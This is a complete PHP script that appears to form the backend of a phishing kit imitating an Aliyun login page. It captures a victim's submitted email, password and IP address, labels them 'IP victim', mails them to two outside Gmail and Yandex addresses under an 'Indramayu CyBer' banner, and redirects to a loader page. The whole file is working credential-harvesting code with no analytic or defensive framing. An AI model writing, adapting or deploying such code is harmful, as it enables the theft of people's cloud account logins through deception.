<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['a'];
$password = $_POST['p'];


$login = "Email : ".$email;
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;


$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "ALIYUN LOGIN | ".$ip;
mail("serviceonlinecare01@gmail.com,blessedbox1@yandex.com", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: loader.php");
?>